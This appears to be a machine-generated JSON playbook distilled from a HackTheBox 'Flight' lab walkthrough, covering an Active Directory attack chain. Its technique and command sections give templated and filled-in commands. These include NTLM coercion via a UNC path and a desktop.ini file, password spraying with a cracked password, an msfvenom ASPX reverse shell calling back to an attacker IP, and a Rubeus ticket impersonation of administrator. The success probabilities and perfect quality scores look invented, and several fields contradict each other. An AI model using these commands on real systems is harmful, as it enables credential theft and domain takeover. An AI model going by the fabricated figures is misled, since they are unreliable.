{
  "writeup_id": "Htb_Flight",
  "scenario_fingerprint": {
    "scenario_name": "windows_domain_controller_smb_relay_chain",
    "primary_services": [
      "http",
      "smb",
      "ldap",
      "kerberos",
      "dns"
    ],
    "port_signature": "53+80+88+389+445",
    "service_combination": "dns+http+kerberos+ldap+smb",
    "os_family": "windows_server",
    "environment_type": "active_directory",
    "entry_vector": "smb_relay_attack",
    "privilege_path": "user_to_service_account_to_machine_account",
    "attack_complexity": "hard",
    "estimated_time": "2-3 hours",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "mixed_web_technologies",
      "apache_php_and_iis_aspx",
      "smb_ntlmv2_capture",
      "password_reuse_across_accounts",
      "service_account_machine_auth"
    ],
    "environmental_clues": [
      "domain_controller_role",
      "dual_web_stack_deployment",
      "shared_file_access_permissions",
      "service_account_network_auth"
    ],
    "similar_scenarios": [
      "intelligence_htb_hard",
      "blackfield_htb_hard"
    ],
    "unique_aspects": [
      "apache_php_smb_callback",
      "iis_aspx_webshell_upload",
      "machine_account_privilege_abuse",
      "multi_stage_credential_capture"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "SMB_Forced_Authentication",
        "success_reason": "PHP site processed UNC path in file parameter, triggering SMB auth",
        "prerequisite_indicators": [
          "php_enabled_webserver",
          "file_inclusion_parameters",
          "windows_target_environment",
          "smb_accessible_from_target"
        ],
        "recognition_patterns": [
          "UNC path acceptance (\\\\attacker\\share)",
          "file parameter in web requests",
          "PHP file functions (include, require, file_get_contents)",
          "Net NTLMv2 hash capture"
        ],
        "failure_modes": [
          "outbound_smb_blocked",
          "file_parameter_sanitized",
          "php_disabled_functions",
          "network_segmentation"
        ],
        "environmental_factors": [
          "windows_php_environment",
          "default_smb_client_config",
          "no_outbound_filtering",
          "automatic_authentication"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "Password_Spraying",
        "success_reason": "Cracked password reused across multiple domain accounts",
        "prerequisite_indicators": [
          "domain_user_enumeration_possible",
          "weak_password_policies",
          "credential_reuse_culture",
          "rpc_enumeration_available"
        ],
        "recognition_patterns": [
          "multiple successful authentications",
          "common password patterns",
          "service account naming conventions",
          "domain user list accessible"
        ],
        "failure_modes": [
          "account_lockout_policies",
          "unique_passwords_enforced",
          "user_enumeration_blocked",
          "rate_limiting_active"
        ],
        "environmental_factors": [
          "weak_password_policy",
          "password_reuse_common",
          "no_account_lockout",
          "rpc_enumeration_enabled"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "SMB_Share_File_Drop",
        "success_reason": "User had write access to shared folder, enabling malicious file placement",
        "prerequisite_indicators": [
          "write_access_to_shares",
          "file_monitoring_systems",
          "automatic_file_processing",
          "shared_folder_usage"
        ],
        "recognition_patterns": [
          "successful file upload to share",
          "SCF/LNK file acceptance",
          "automatic hash capture",
          "privileged user interaction"
        ],
        "failure_modes": [
          "read_only_share_access",
          "file_type_restrictions",
          "no_user_interaction",
          "av_blocking_malicious_files"
        ],
        "environmental_factors": [
          "active_file_sharing",
          "user_file_interaction",
          "minimal_file_restrictions",
          "automatic_authentication"
        ],
        "success_probability": 0.7,
        "typical_timeframe": "20-40 minutes"
      },
      {
        "technique": "ASPX_Webshell_Upload",
        "success_reason": "IIS site allowed ASPX file upload with execution permissions",
        "prerequisite_indicators": [
          "iis_webserver_access",
          "file_upload_functionality",
          "aspx_execution_enabled",
          "write_permissions_to_webroot"
        ],
        "recognition_patterns": [
          "successful ASPX file upload",
          "code execution via web request",
          "IIS worker process context",
          "system-level command execution"
        ],
        "failure_modes": [
          "file_upload_restrictions",
          "aspx_execution_disabled",
          "insufficient_permissions",
          "request_filtering_active"
        ],
        "environmental_factors": [
          "iis_default_configuration",
          "aspx_enabled_site",
          "minimal_upload_restrictions",
          "service_account_context"
        ],
        "success_probability": 0.8,
        "typical_timeframe": "10-25 minutes"
      },
      {
        "technique": "Machine_Account_Abuse",
        "success_reason": "Service account authenticated as machine account over network",
        "prerequisite_indicators": [
          "service_account_context",
          "machine_account_privileges",
          "network_authentication_capability",
          "domain_controller_access"
        ],
        "recognition_patterns": [
          "machine account hash capture",
          "elevated privilege context",
          "domain admin equivalent access",
          "unrestricted delegation potential"
        ],
        "failure_modes": [
          "service_isolation_enabled",
          "machine_account_restricted",
          "network_auth_blocked",
          "credential_guard_active"
        ],
        "environmental_factors": [
          "default_service_configuration",
          "machine_account_privileges",
          "network_service_context",
          "domain_trust_relationships"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "15-30 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "PHP file inclusion vulnerability",
        "discovery_method": "Parameter testing with UNC paths",
        "why_critical": "Enabled SMB hash capture and initial foothold",
        "how_to_recognize": [
          "file parameter in web requests",
          "PHP-enabled Windows environment",
          "UNC path processing capability"
        ],
        "follow_up_actions": [
          "setup_smb_responder",
          "test_unc_path_injection",
          "capture_ntlmv2_hashes"
        ]
      },
      {
        "discovery": "Reused credentials across domain accounts",
        "discovery_method": "Password spraying after hash cracking",
        "why_critical": "Provided lateral movement and additional access",
        "how_to_recognize": [
          "successful authentication with same password",
          "multiple account access",
          "different privilege levels"
        ],
        "follow_up_actions": [
          "enumerate_all_accessible_resources",
          "check_share_permissions",
          "identify_privilege_escalation_paths"
        ]
      },
      {
        "discovery": "IIS site with ASPX upload capability",
        "discovery_method": "Subdomain enumeration and access testing",
        "why_critical": "Provided code execution and system-level access",
        "how_to_recognize": [
          "IIS server identification",
          "ASPX file upload acceptance",
          "code execution confirmation"
        ],
        "follow_up_actions": [
          "upload_aspx_webshell",
          "establish_reverse_shell",
          "enumerate_service_context"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "anonymous_web_user",
        "escalation_method": "SMB_Hash_Capture_to_Domain_User",
        "why_possible": "PHP processed UNC paths triggering automatic authentication",
        "recognition_signs": [
          "php_file_functions_available",
          "windows_target_environment",
          "outbound_smb_allowed"
        ],
        "exploitation_path": "UNC Path Injection → SMB Hash Capture → Hash Cracking → Domain User"
      },
      {
        "privilege_level": "domain_user",
        "escalation_method": "Share_Write_to_Privileged_Hash",
        "why_possible": "Write access to shared folders with user interaction",
        "recognition_signs": [
          "write_permissions_on_shares",
          "active_user_file_interaction",
          "scf_lnk_file_processing"
        ],
        "exploitation_path": "Share Write Access → Malicious File Drop → Hash Capture → Privileged User"
      },
      {
        "privilege_level": "privileged_domain_user",
        "escalation_method": "ASPX_Upload_to_System",
        "why_possible": "Access to IIS site with ASPX execution enabled",
        "recognition_signs": [
          "iis_site_access",
          "file_upload_capability",
          "aspx_execution_enabled"
        ],
        "exploitation_path": "IIS Access → ASPX Upload → Code Execution → Service Account"
      },
      {
        "privilege_level": "service_account",
        "escalation_method": "Machine_Account_to_Domain_Admin",
        "why_possible": "Service account context provided machine account privileges",
        "recognition_signs": [
          "service_account_context",
          "network_authentication_as_machine",
          "machine_account_hash_accessible"
        ],
        "exploitation_path": "Service Account → Machine Account Auth → Administrator Hash → Domain Admin"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 53,80,88,135,139,389,445,464,593,636,5985,9389 open on Windows host",
        "decision": "Identify as Domain Controller and prioritize SMB/Web enumeration",
        "reasoning": "Port combination indicates AD DC with high probability, web server present",
        "confidence": 0.95,
        "alternatives": [
          {
            "option": "kerberos_enumeration",
            "when": "if smb/web fails"
          },
          {
            "option": "ldap_enumeration",
            "when": "if anonymous access available"
          }
        ],
        "success_indicators": [
          "domain_name_discovered",
          "web_services_responding",
          "smb_accessible"
        ],
        "next_decision": "enumerate_web_attack_surface"
      },
      {
        "step": 2,
        "situation": "Apache/PHP web server discovered with subdomain enumeration revealing school.flight.htb",
        "decision": "Test for SMB connection back attacks via web application",
        "reasoning": "PHP on Windows often vulnerable to UNC path injection leading to credential theft",
        "confidence": 0.8,
        "prerequisites": [
          "web_application_identified",
          "php_enabled",
          "windows_target"
        ],
        "success_indicators": [
          "smb_connection_received",
          "ntlmv2_hash_captured"
        ],
        "failure_fallbacks": [
          "directory_traversal",
          "file_upload",
          "parameter_fuzzing"
        ]
      },
      {
        "step": 3,
        "situation": "Net NTLMv2 hash captured from web application",
        "decision": "Crack hash and use for password spraying",
        "reasoning": "Cracked password often reused across domain accounts",
        "confidence": 0.85,
        "prerequisites": [
          "ntlmv2_hash_obtained"
        ],
        "success_indicators": [
          "password_cracked",
          "additional_accounts_found"
        ],
        "failure_fallbacks": [
          "relay_attack",
          "responder_poisoning"
        ]
      },
      {
        "step": 4,
        "situation": "Valid domain credentials obtained, user has write access to shares",
        "decision": "Drop malicious files to provoke additional authentication",
        "reasoning": "File access by other users/services can trigger credential exposure",
        "confidence": 0.75,
        "prerequisites": [
          "domain_credentials",
          "write_access_to_shares"
        ],
        "success_indicators": [
          "additional_ntlmv2_captured",
          "service_account_hash"
        ],
        "failure_fallbacks": [
          "bloodhound_enumeration",
          "privilege_escalation_enum"
        ]
      },
      {
        "step": 5,
        "situation": "Service account credentials obtained with IIS access",
        "decision": "Upload ASPX webshell for code execution",
        "reasoning": "Service accounts often have elevated privileges and network authentication rights",
        "confidence": 0.9,
        "prerequisites": [
          "service_account_access",
          "iis_write_permissions"
        ],
        "success_indicators": [
          "webshell_uploaded",
          "code_execution_achieved"
        ],
        "failure_fallbacks": [
          "existing_file_modification",
          "config_file_abuse"
        ]
      }
    ],
    "branching_logic": {
      "if_web_smb_attack_succeeds": {
        "action": "crack_ntlmv2_and_spray",
        "tools": [
          "hashcat",
          "crackmapexec"
        ],
        "next_phase": "credential_reuse_testing"
      },
      "if_password_spray_succeeds": {
        "action": "enumerate_share_permissions",
        "tools": [
          "smbclient",
          "crackmapexec"
        ],
        "next_phase": "lateral_movement_via_shares"
      },
      "if_service_account_obtained": {
        "action": "abuse_machine_account_privileges",
        "purpose": "escalate_to_domain_admin",
        "tools": [
          "impacket",
          "rubeus"
        ]
      },
      "if_iis_access_gained": {
        "action": "upload_aspx_webshell",
        "purpose": "achieve_code_execution",
        "tools": [
          "msfvenom",
          "custom_aspx"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_unc_injection_on_php_windows",
        "reasoning": "high_success_rate_for_credential_theft",
        "applicability": "php_applications_on_windows"
      },
      {
        "rule": "password_spray_after_any_credential_capture",
        "reasoning": "password_reuse_common_in_domain_environments",
        "applicability": "domain_environments"
      },
      {
        "rule": "abuse_service_account_network_authentication",
        "reasoning": "service_accounts_authenticate_as_machine_account",
        "applicability": "service_account_compromise"
      },
      {
        "rule": "use_file_drops_to_trigger_additional_auth",
        "reasoning": "automated_processes_often_access_shared_files",
        "applicability": "write_access_to_network_shares"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "SMB_Relay_Attack",
        "mitre_id": "T1557.001",
        "required_services": [
          "smb",
          "http"
        ],
        "required_ports": [
          445,
          80,
          443
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "smb_service_accessible",
          "web_application_with_file_inclusion",
          "ntlm_authentication_enabled"
        ],
        "success_indicators": [
          "net_ntlmv2_hash_captured",
          "smb_connection_established",
          "web_app_makes_outbound_requests"
        ],
        "incompatible_with": [
          "smb_signing_required",
          "network_isolation",
          "kerberos_only_auth"
        ],
        "confidence_boosters": [
          "php_web_application",
          "file_upload_functionality",
          "unc_path_injection_possible"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "Password_Spraying",
        "mitre_id": "T1110.003",
        "required_services": [
          "smb",
          "ldap",
          "winrm"
        ],
        "required_ports": [
          445,
          389,
          5985
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "active_directory_domain",
          "user_enumeration_possible",
          "weak_password_policy"
        ],
        "success_indicators": [
          "valid_credentials_found",
          "multiple_users_same_password",
          "rpc_enumeration_successful"
        ],
        "incompatible_with": [
          "account_lockout_enabled",
          "strong_password_policy",
          "mfa_required"
        ],
        "confidence_boosters": [
          "default_passwords_common",
          "seasonal_password_patterns",
          "company_name_in_passwords"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "15-45 minutes"
      },
      {
        "technique": "ASPX_Webshell_Upload",
        "mitre_id": "T1505.003",
        "required_services": [
          "http",
          "iis"
        ],
        "required_ports": [
          80,
          443,
          8080
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "iis_web_server",
          "aspx_support_enabled",
          "write_access_to_webroot"
        ],
        "success_indicators": [
          "aspx_file_uploaded_successfully",
          "webshell_accessible_via_http",
          "command_execution_confirmed"
        ],
        "incompatible_with": [
          "file_upload_restrictions",
          "application_whitelisting",
          "read_only_filesystem"
        ],
        "confidence_boosters": [
          "iis_server_detected",
          "aspnet_framework_present",
          "file_upload_functionality"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "5-20 minutes"
      },
      {
        "technique": "Service_Account_Impersonation",
        "mitre_id": "T1134.001",
        "required_services": [
          "kerberos",
          "ldap"
        ],
        "required_ports": [
          88,
          389
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "active_directory_domain",
          "service_account_access",
          "machine_account_privileges"
        ],
        "success_indicators": [
          "service_account_shell_obtained",
          "machine_account_authentication",
          "elevated_privileges_confirmed"
        ],
        "incompatible_with": [
          "service_account_restrictions",
          "constrained_delegation_only",
          "network_isolation"
        ],
        "confidence_boosters": [
          "iis_service_account",
          "default_service_configurations",
          "unconstrained_delegation"
        ],
        "typical_success_rate": 0.7,
        "estimated_time": "20-60 minutes"
      }
    ],
    "environmental_detectors": {
      "active_directory": {
        "port_indicators": [
          53,
          88,
          389,
          445,
          636,
          3268,
          9389
        ],
        "service_indicators": [
          "kerberos",
          "ldap",
          "smb",
          "dns",
          "adws"
        ],
        "banner_indicators": [
          "Active Directory",
          "Windows Server",
          "Microsoft Windows Kerberos"
        ],
        "confidence_threshold": 0.9
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "apache",
          "nginx",
          "iis",
          "php"
        ],
        "confidence_threshold": 0.85
      },
      "windows_domain_controller": {
        "port_indicators": [
          53,
          88,
          135,
          389,
          445,
          464,
          636,
          5985,
          9389
        ],
        "service_indicators": [
          "domain",
          "kerberos-sec",
          "ldap",
          "microsoft-ds",
          "kpasswd5"
        ],
        "banner_indicators": [
          "Windows",
          "Microsoft",
          "Domain Controller"
        ],
        "confidence_threshold": 0.95
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "smb_relay_via_web_app",
          "when": "web_app_and_smb_detected",
          "reason": "high_success_rate_credential_capture"
        },
        {
          "attack": "password_spraying",
          "when": "active_directory_detected",
          "reason": "common_weak_passwords_in_domain"
        },
        {
          "attack": "rpc_user_enumeration",
          "when": "rpc_service_accessible",
          "reason": "enables_targeted_password_attacks"
        }
      ],
      "medium_priority": [
        {
          "attack": "aspx_webshell_upload",
          "when": "iis_server_with_write_access",
          "reason": "reliable_code_execution_method"
        },
        {
          "attack": "service_account_abuse",
          "when": "service_account_compromised",
          "reason": "potential_privilege_escalation"
        }
      ],
      "low_priority": [
        {
          "attack": "directory_bruteforce",
          "when": "web_service_detected",
          "reason": "time_consuming_but_thorough"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "SMB Forced Authentication via PHP LFI",
        "mitre_id": "T1187",
        "category": "credential_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "responder",
            "command_template": "responder -I {interface}",
            "actual_command": "responder -I tun0",
            "output_pattern": "NTLMv2-SSP Hash",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "curl",
            "command_template": "curl 'http://{target}/index.php?view=///{attacker_ip}/share'",
            "actual_command": "curl 'http://school.flight.htb/index.php?view=///10.10.14.6/share'",
            "success_factors": [
              "php_include_vulnerability",
              "smb_outbound_allowed"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "php_lfi_vulnerability",
          "smb_outbound_connectivity",
          "responder_listening"
        ],
        "success_indicators": [
          "ntlmv2_hash_captured",
          "domain_user_credentials_obtained",
          "authentication_attempt_logged"
        ],
        "common_failures": [
          "outbound_smb_blocked",
          "php_include_restrictions",
          "no_automatic_authentication"
        ],
        "follow_up_techniques": [
          "password_cracking",
          "credential_spraying",
          "smb_enumeration"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Password Spraying",
        "mitre_id": "T1110.003",
        "category": "credential_access",
        "phase": "lateral_movement",
        "tools_used": [
          {
            "name": "crackmapexec",
            "command_template": "crackmapexec smb {target} -u {userlist} -p '{password}' --continue-on-success",
            "actual_command": "crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success",
            "output_pattern": "[+] flight.htb\\{username}:{password}",
            "effectiveness_rating": 4,
            "reliability": 0.85
          },
          {
            "name": "rpcclient",
            "command_template": "rpcclient -U '' -N {target} -c 'enumdomusers'",
            "actual_command": "rpcclient -U '' -N 10.10.11.187 -c 'enumdomusers'",
            "success_factors": [
              "null_session_allowed",
              "rpc_enumeration_enabled"
            ],
            "effectiveness_rating": 3
          }
        ],
        "prerequisites": [
          "valid_password_obtained",
          "domain_user_list_available",
          "smb_access_available"
        ],
        "success_indicators": [
          "additional_valid_credentials_found",
          "different_privilege_levels_discovered",
          "share_access_expanded"
        ],
        "common_failures": [
          "account_lockout_policies",
          "password_not_reused",
          "detection_by_security_tools"
        ],
        "follow_up_techniques": [
          "smb_share_enumeration",
          "privilege_escalation",
          "lateral_movement"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "SMB Share File Drop for Credential Harvesting",
        "mitre_id": "T1187",
        "category": "credential_access",
        "phase": "lateral_movement",
        "tools_used": [
          {
            "name": "smbclient",
            "command_template": "smbclient //{target}/{share} -U {username}%{password}",
            "actual_command": "smbclient //10.10.11.187/Shared -U S.Moon%S@Ss!K@*t13",
            "output_pattern": "smb: \\>",
            "effectiveness_rating": 4,
            "reliability": 0.95
          },
          {
            "name": "desktop.ini",
            "command_template": "echo '[.ShellClassInfo]\\nIconResource=\\\\{attacker_ip}\\share\\test.ico' > desktop.ini",
            "actual_command": "echo '[.ShellClassInfo]\\nIconResource=\\\\10.10.14.6\\share\\test.ico' > desktop.ini",
            "success_factors": [
              "windows_explorer_access",
              "automatic_icon_loading"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "smb_write_access",
          "windows_file_shares_browsed",
          "responder_listening"
        ],
        "success_indicators": [
          "file_successfully_uploaded",
          "ntlmv2_hash_captured_from_browsing",
          "higher_privilege_account_compromised"
        ],
        "common_failures": [
          "files_not_browsed",
          "antivirus_detection",
          "file_upload_restrictions"
        ],
        "follow_up_techniques": [
          "hash_cracking",
          "privilege_escalation",
          "service_account_abuse"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "ASPX Webshell Upload",
        "mitre_id": "T1505.003",
        "category": "persistence",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "msfvenom",
            "command_template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx",
            "actual_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f aspx -o shell.aspx",
            "output_pattern": "aspx payload generated",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "curl",
            "command_template": "curl -u {username}:{password} --upload-file {webshell} http://{target}/{path}",
            "actual_command": "curl -u c.bum:Tikkycoll_431012284 --upload-file shell.aspx http://school.flight.htb/shell.aspx",
            "success_factors": [
              "iis_write_permissions",
              "aspx_execution_enabled"
            ],
            "effectiveness_rating": 4
          }
        ],
        "prerequisites": [
          "iis_web_server_access",
          "file_upload_permissions",
          "aspx_execution_allowed"
        ],
        "success_indicators": [
          "webshell_successfully_uploaded",
          "reverse_shell_connection_established",
          "code_execution_as_service_account"
        ],
        "common_failures": [
          "upload_restrictions",
          "antivirus_detection",
          "aspx_execution_disabled"
        ],
        "follow_up_techniques": [
          "service_account_privilege_abuse",
          "machine_account_impersonation",
          "domain_controller_attack"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Service Account Machine Authentication Abuse",
        "mitre_id": "T1134.001",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "rubeus",
            "command_template": "Rubeus.exe s4u /user:{machine_account} /rc4:{hash} /impersonateuser:administrator /msdsspn:cifs/{target} /ptt",
            "actual_command": "Rubeus.exe s4u /user:G0$ /rc4:machine_hash /impersonateuser:administrator /msdsspn:cifs/g0.flight.htb /ptt",
            "output_pattern": "Ticket successfully imported",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "service_account_shell",
          "machine_account_hash_obtained",
          "kerberos_delegation_configured"
        ],
        "success_indicators": [
          "administrator_ticket_obtained",
          "domain_admin_access_achieved",
          "full_system_compromise"
        ],
        "common_failures": [
          "delegation_not_configured",
          "machine_account_restrictions",
          "kerberos_errors"
        ],
        "follow_up_techniques": [
          "domain_persistence",
          "credential_dumping",
          "lateral_movement"
        ],
        "time_investment": "20-60 minutes",
        "skill_level": "advanced"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Responder",
        "use_case": "ntlmv2_hash_capture",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "smb_relay_attacks",
          "credential_harvesting"
        ],
        "alternatives": [
          "inveigh",
          "ntlmrelayx"
        ],
        "best_practices": [
          "run_on_correct_interface",
          "monitor_for_multiple_hash_types",
          "combine_with_forced_authentication_techniques"
        ]
      },
      {
        "tool": "CrackMapExec",
        "use_case": "credential_validation_and_spraying",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "medium",
        "essential_for": [
          "active_directory_enumeration",
          "credential_validation"
        ],
        "alternatives": [
          "smbclient",
          "rpcclient",
          "ldapsearch"
        ],
        "best_practices": [
          "use_continue_on_success_for_spraying",
          "validate_credentials_before_exploitation",
          "enumerate_shares_after_credential_validation"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "lfi_to_smb_hash_capture",
        "steps": [
          {
            "step": 1,
            "command": "responder -I tun0",
            "purpose": "Start SMB hash capture listener",
            "expected_output": "Responder listening on interface"
          },
          {
            "step": 2,
            "command": "curl 'http://school.flight.htb/index.php?view=///10.10.14.6/share'",
            "purpose": "Force SMB authentication via PHP LFI",
            "expected_output": "NTLMv2 hash captured in responder"
          },
          {
            "step": 3,
            "command": "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
            "purpose": "Crack captured NTLMv2 hash",
            "expected_output": "Plaintext password recovered"
          }
        ],
        "success_rate": 0.85,
        "typical_duration": "10-30 minutes"
      },
      {
        "sequence_name": "password_spray_to_share_access",
        "steps": [
          {
            "step": 1,
            "command": "rpcclient -U '' -N 10.10.11.187 -c 'enumdomusers'",
            "purpose": "Enumerate domain users",
            "expected_output": "List of domain user accounts"
          },
          {
            "step": 2,
            "command": "crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success",
            "purpose": "Spray password against user list",
            "expected_output": "Additional valid credentials found"
          },
          {
            "step": 3,
            "command": "crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares",
            "purpose": "Enumerate accessible shares",
            "expected_output": "List of readable/writable shares"
          }
        ],
        "success_rate": 0.75,
        "typical_duration": "15-45 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Flight",
      "difficulty": "Hard",
      "os": "Windows",
      "platform": "HackTheBox",
      "release_date": "2022-11-05",
      "author": "Geiseric",
      "estimated_time": "3-4 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "smb_relay",
        "ntlmv2_cracking",
        "password_spray",
        "webshell_upload"
      ],
      "key_vulnerabilities": [
        "smb_authentication_coercion",
        "shared_passwords",
        "file_upload",
        "service_account_privileges"
      ],
      "environment_type": "corporate_domain_controller",
      "real_world_relevance": "very_high",
      "learning_value": [
        "smb_relay_attacks",
        "ntlm_authentication_abuse",
        "multi_stage_pivoting",
        "service_account_exploitation"
      ],
      "prerequisite_knowledge": [
        "smb_protocols",
        "ntlm_authentication",
        "web_application_security",
        "active_directory_basics"
      ]
    },
    "categorization": {
      "primary_category": "active_directory",
      "subcategories": [
        "credential_harvesting",
        "lateral_movement",
        "privilege_escalation",
        "web_exploitation"
      ],
      "attack_types": [
        "credential_access",
        "lateral_movement",
        "privilege_escalation",
        "initial_access"
      ],
      "defensive_lessons": [
        "smb_signing",
        "credential_hygiene",
        "file_upload_restrictions",
        "service_account_hardening"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Responder",
        "Intelligence",
        "Scrambled"
      ],
      "similarity_reasons": [
        "smb_relay_attacks",
        "ntlm_coercion",
        "multi_service_exploitation",
        "credential_reuse"
      ],
      "unique_aspects": [
        "dual_web_technologies",
        "apache_php_iis_aspx_combo",
        "machine_account_abuse"
      ],
      "difficulty_factors": [
        "multi_stage_attack_chain",
        "service_enumeration",
        "authentication_coercion_techniques"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T00:23:45.542788",
    "original_file": "0xdf_writeups/Htb Flight.md",
    "content_length": 65480,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}